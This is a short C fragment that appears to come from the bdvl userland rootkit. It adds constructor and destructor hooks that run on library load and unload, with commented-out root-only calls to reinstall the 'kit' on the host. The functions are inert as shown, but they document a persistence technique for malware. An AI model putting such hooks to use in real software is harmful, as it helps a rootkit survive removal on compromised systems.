// this file just gets appended onto the end of bdvl.c
void __attribute ((constructor)) phook_init (void)
{
    //if(geteuid() == 0) reinstall(); // attempt to check kit status on the box and reinstall if needed
}

void __attribute ((destructor)) phook_dest (void)
{
    //if(getuid() == 0) reinstall(); // do same on process end
}
